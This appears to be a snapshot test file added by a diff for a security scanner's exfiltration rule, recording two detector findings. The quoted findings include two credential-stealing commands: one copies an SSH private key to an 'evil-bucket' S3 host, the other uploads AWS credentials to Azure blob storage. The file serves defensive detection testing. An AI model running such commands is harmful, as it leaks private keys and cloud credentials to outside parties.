@@ -1,0 +1,28 @@
+---
+source: src/rules/builtin/exfiltration.rs
+expression: findings
+---
+[
+  {
+    "id": "EX-007",
+    "severity": "high",
+    "category": "exfiltration",
+    "confidence": "tentative",
+    "name": "Cloud storage exfiltration",
+    "line": 5,
+    "code": "aws s3 cp ~/.ssh/id_rsa s3://evil-bucket/$SECRET",
+    "message": "Cloud storage exfiltration pattern detected. Sensitive data may be uploaded to cloud services.",
+    "recommendation": "Review cloud storage operations and ensure no sensitive data is being exfiltrated."
+  },
+  {
+    "id": "EX-007",
+    "severity": "high",
+    "category": "exfiltration",
+    "confidence": "tentative",
+    "name": "Cloud storage exfiltration",
+    "line": 7,
+    "code": "az storage blob upload --file $HOME/.aws/credentials",
+    "message": "Cloud storage exfiltration pattern detected. Sensitive data may be uploaded to cloud services.",
+    "recommendation": "Review cloud storage operations and ensure no sensitive data is being exfiltrated."
+  }
+]
